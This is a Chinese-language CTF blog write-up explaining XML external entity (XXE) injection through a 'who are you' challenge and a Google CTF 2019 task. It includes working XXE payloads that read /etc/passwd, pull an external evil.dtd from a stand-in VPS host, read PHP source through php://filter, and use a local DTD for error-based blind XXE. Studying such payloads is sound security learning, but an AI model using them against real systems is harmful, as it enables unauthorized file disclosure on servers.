---
title: 'xxe学习'
date: 2019-08-15
updated: 2019-08-22
category: 'ctf'
tags:
  - 'xxe'
  - 'xml'
lang: 'zh'
draft: false
---
今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下：

原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1)

查看页面的源代码发现：

```javascript
function play() {
     return false;
 }
 function func() {
     // document.getElementById().value
     var xml = '' +
         '<\?xml version="1.0" encoding="UTF-8"\?>' +
         '<feedback>' +
         '<author>' + document.getElementById('name').value+ '</author>' +
         '</feedback>';
     console.log(xml);
     var xmlhttp = new XMLHttpRequest();
     xmlhttp.onreadystatechange = function () {
         if (xmlhttp.readyState == 4) {
             // console.log(xmlhttp.readyState);
             // console.log(xmlhttp.responseText);
             var res = xmlhttp.responseText;
             document.getElementById('title').textContent = res
         }
     };
     xmlhttp.open("POST", "index.php", true);
     xmlhttp.send(xml);
     return false;
 };
```

显然xml数据是拼接的，直接对`<script>`进行实体编码就能够xss，然而这题的考点并不是这个。

xml相关的自然是xxe，也就是XML 外部实体注入

这需要有一点DTD的知识：

> DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。  
> DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

DTD的引入是为了规范XML的，从一个栗子可以看：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe.png)

DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。

DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用

*内部实体声明D*

```
DTD 实例:

<!ENTITY writer "Donald Duck.">
<!ENTITY copyright "Copyright runoob.com">

XML 实例：

<author>&writer;&copyright;</author>
```

*外部实体声明*

```
DTD 实例:

<!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">

XML example:

<author>&writer;&copyright;</author>
```

最常见的引入外部实体就是通过file协议读取文件：

```xml
<?xml version="1.0" ?>
<!DOCTYPE a [
    <!ENTITY b SYSTEM "file:///etc/passwd">
]>
<c>&b;</c>
```

另一种payload

```xml
<?xml version="1.0"?>
<!DOCTYPE a[
    <!ENTITY % d SYSTEM "http://vps/evil.dtd">
    %d;
]>
<c>&b;</c>
```

我们可以在自己的VPS上构造  

```xml
<!ENTITY b SYSTEM "file:///etc/passwd">
```

也可以这样：

```xml
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://vps//evil.dtd">
<c>&b;</c>
```

vps上的evil.dtd内容：  
`<!ENTITY b SYSTEM "file:///etc/passwd">`

不同的程序支持的协议也有区别，比如今天遇到的题目就是支持php伪协议：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe0.png)

ok到这里就差不多了。

献上拿到题目的payload：

`<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>`

其实就是通过php伪协议去读取文件，flag就在index.php里面

接下来看一道Google ctf2019的题目：

直奔主题好了，这个题目抓包发现传送的是json格式的数据，但是也可以修改为XML格式的数据，很神奇吧：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe1.png)

之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势：

payload

```
<!DOCTYPE message[
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % ISOamso '
	<!ENTITY &#x25; file SYSTEM "file:///etc/passed">
	<!ENTITY &#x25; eval "<!ENTITY &#x26;&#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
	&#x25;eval;
	&#x25;error;
	'>
	%local_dtd;
]>
```

## 参考

[CTF学习—web—XXE](https://zhuanlan.zhihu.com/p/36517036)

[菜鸟教程](https://www.runoob.com/dtd/dtd-entities.html)

[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)
